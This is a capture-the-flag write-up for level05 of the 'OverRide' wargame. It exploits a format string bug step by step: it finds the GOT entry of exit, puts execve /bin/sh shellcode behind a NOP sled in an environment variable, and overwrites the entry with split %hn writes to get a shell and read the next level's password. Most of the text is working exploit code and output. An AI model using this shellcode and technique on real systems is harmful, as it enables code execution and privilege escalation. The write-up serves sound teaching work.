# Level 05

Once logged in, you will see a binary.

```
$ ssh 164.92.144.154 -p 4242 -l level05
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 164.92.144.154:4242
level05@164.92.144.154's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$ ls
level05
```

Okay, let's run the program.

```
level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$ ./level05
AAAAAAAAAAAAAaaaaaaaaaaaAAaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level05@OverRide:~$
```

By looking at the execution result of the program, two things can be observed,
- the uppercase letters will be turned into lower case letters
- if the length of input is too long, the output will only print 99 characters

By looking at the decompiled source (or with GDB), the program uses `printf`, so there is a chance of us using a format string attack.

```
gdb-peda$ info functions
[...]
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
[...]
0x08048370  exit
0x08048370  exit@plt
[...]
```

`exit` is also called, and we can overrite the exit() in the GOT section (Global Offset Table). Let's find the GOT address of `exit`:

```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

We now have an address for `exit` (`0x080497e0`), and we need to provide a payload that contains a shellcode. In this case, we'll use a noop-sled in order to ensure our shellcode gets run correctly.

```
# our shellcode
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

# store create payload that stores shellcode
export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```

With the shellcode stored into the environment variable, a program can be written to access the address of the shellcode.

```
level05@OverRide:~$ cat /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	printf("env address: %p\n", getenv(argv[1]));
	return (0);
}
level05@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv  # NOTE: for 32bit
level05@OverRide:~$ export PAYLOAD=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
level05@OverRide:/tmp$ ./getenv PAYLOAD
env address: 0xffffdbb7                                    # NOTE: will change per machine
```

We now have address we want to overwrite (`exit`: `0x080497e0`) and the data we want to write (`PAYLOAD`: `0xffffdbb7`).

Unfortunately, `0xffffdbb7` is quite large in decimal (`4294958007`), and it doesn't make sense to print that many characters in order to write the correct value with `printf`'s `%n` functionality. (Theoretically it would take approximately 7 minutes, but we'll count that as too long for our purposes.)

Instead, we'll write the number as two separate `printf` `%n` exploits by splitting the number into two `short`s instead of an `int`. Our exploit will be in the following format:

```
AAAABBBB                        %n                                   %n
    ^ Points to second short    ^ After [first short value] bytes    ^ After [second short value] bytes
^ Points to first short           Takes AAAA as "param"                Takes BBBB as "param"
```
Here's the process for splitting the `int` into two `short`s:

| Step                                              | First `short`                                                                     | Second `short`                                                                          |
|---------------------------------------------------|-----------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------|
| Splitting the `int` (and moving to little-endian) | `0xffffdbb7`: original<br>`------^^^^`: selection<br>`------1122`: order of bytes | `0xffffdbb7`: original<br>`--^^^^----`: selection<br>`--1122----`: order of bytes       |
| Little-endian `short` value to write              | `0xdbb7`                                                                          | `0xffff`                                                                                |
| Decimal value of the hex `short`                  | `56247`                                                                           | `65535`                                                                                 |
| How many bytes written before?                    | 2 pointers (4 bytes each) = `8` bytes                                             | `56247` bytes                                                                           |
| Number of `char`s to pad up to                    | `56247` - `8` = `56239`                                                           | `65535` - `56247` = `9288`                                                             |
| Address to write to                               | `0x080497e0`                                                                      | `0x080497e0` + 2 bytes = `0x080497e2`<br>Note: We add 2 bytes because it's the second `short` |
| Argument offset (see below)                       | 10                                                                                | 11                                                                                      |

We need to find where in memory our string is being stored in order to pass in our own input as "arguments" into `printf`. Let's find out the offset we need to pass into `printf`.

```
level05@OverRide:~$ echo "AAAABBBB %x %x %x %x %x %x %x %x %x %x %x" | ./level05
aaaabbbb 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 62626262
```

So our two offsets are 10 and 11.

We'll need to print a certain number of characters before each `%n`. Instead of using Python to print these (which would be relatively slow), we'll use the zero padding (`%0`) functionality of `printf`. For example, `%015x` prints the stack where the first argument to `printf` would be (if there was one), zero-padded to be a total of `15` characters. We specify the offsets with the `$` functionality of `printf`.

Lights, camera, action!

```
level05@OverRide:~$ (python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%056239u%10$hn" + "%09288u%11$hn")'; cat -) | ./level05
[...]00004160551616
whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
^C
level05@OverRide:~$
```
